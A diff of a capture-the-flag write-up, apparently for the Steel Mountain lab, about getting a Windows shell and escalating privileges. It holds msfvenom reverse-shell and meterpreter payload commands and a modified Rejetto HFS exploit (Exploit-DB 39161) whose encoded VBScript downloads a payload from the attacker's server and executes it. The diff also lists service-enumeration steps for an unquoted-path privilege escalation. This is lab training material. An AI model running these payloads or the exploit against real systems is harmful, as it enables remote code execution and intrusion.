@@ -14,36 +14,6 @@
 
 #### Retrieving shell (without metasploit)
 
-&#x20;_**Windows reverse TCP payload**_
-
-{% code overflow="wrap" %}
-```sh
-$ msfvenom -p windows/shell/reverse_tcp LHOST=<attacker_addr> LPORT=8888 -f exe -o <output>.exe
-```
-{% endcode %}
-
-_**Windows (Powershell) reverse TCP payload**_
-
-{% code overflow="wrap" %}
-```sh
-$ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attacker_addr> LPORT=8888 -o <output>.cmd
-```
-{% endcode %}
-
-_**meterpreter payload**_
-
-{% code overflow="wrap" %}
-```sh
-$ msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT=8888 -o <output>.exe
-```
-{% endcode %}
-
-{% code title="host web server to load payload file" overflow="wrap" %}
-```sh
-$ python3 -m http.server <port>
-```
-{% endcode %}
-
 _**Modified PoC**_
 
 {% embed url="https://www.exploit-db.com/exploits/39161" %}
@@ -84,11 +54,13 @@ try:
 	def nc_run():
 		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
 
-	ip_addr = "10.4.10.179" #local IP address
+	ip_addr = "xxx.xxx.xxx.xxx" #local IP address
 	local_port = "8888" # Local Port number
-	rev_shell_payload = "xxxx"
-
-	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%3A9998%2F"+rev_shell_payload+"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C"+rev_shell_payload+"%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
+	
+	rev_shell_payload_port = "xxxx" # replace with the port number to serve the payload (on the address identified by the "ip_addr" variable declared above)
+	rev_shell_payload = "xxxx" # refer below
+	
+	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%3A"+rev_shell_payload_port+"%2F"+rev_shell_payload+"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C"+rev_shell_payload+"%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
 	save= "save|" + vbs
 	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
 	exe= "exec|"+vbs2
@@ -109,9 +81,43 @@ except:
 ```
 {% endcode %}
 
-{% code overflow="wrap" %}
+{% code title="Execute the script (Python 2)" overflow="wrap" %}
 ```sh
 $ python2 39161.py <target> <port>
+```
+{% endcode %}
+
+Note that we have to replace the `rev_shell_payload` variable in the script above, to the name of the generated payload from **msfvenom**, wit the `.exe` or `.cmd` extensions.
+
+> In general, the generated payloads by msfvenom (refer below) with the `.exe` works to provide us with a shell. However, a payload with `.cmd` may not work as expected.
+
+_**Windows reverse TCP payload**_
+
+{% code overflow="wrap" %}
+```sh
+$ msfvenom -p windows/shell/reverse_tcp LHOST=<attacker_addr> LPORT=8888 -f exe -o <output>.exe
+```
+{% endcode %}
+
+_**Windows (Powershell) reverse TCP payload**_
+
+{% code overflow="wrap" %}
+```sh
+$ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attacker_addr> LPORT=8888 -o <output>.cmd
+```
+{% endcode %}
+
+_**meterpreter payload**_
+
+{% code overflow="wrap" %}
+```sh
+$ msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT=8888 -o <output>.exe
+```
+{% endcode %}
+
+{% code title="host web server to load payload file" overflow="wrap" %}
+```sh
+$ python3 -m http.server <port> # the value of <port> should match the "rev_shell_payload_port" variable in the script
 ```
 {% endcode %}
 
@@ -130,6 +136,18 @@ msf6> run
 
 #### Enumeration
 
+1. PowerUp.ps1 (PowerSploit)
+
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}
+
+2. WinPEAS
+
+{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" %}
+
+After enumeration, we discover that there is a particular service named **AdvancedSystemCareService9** with an unquoted service path, and the `CanRestart` parameter set to **True**. We can use various tools to discover the name of the vulnerable service.
+
+#### Getting more information about services
+
 {% code overflow="wrap" %}
 ```powershell
 PS> Get-Service *
@@ -145,3 +163,6 @@ C:\> icacls "C:\Program Files (x86)\IObit"
 C:\> icacls "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 ```
 
+Now, we can exploit the found service. Refer to the write-up below for more information:
+
+{% embed url="https://medium.com/@weifeng.c01/tryhackme-ctf-steel-mountain-1ac394c030dd" %}
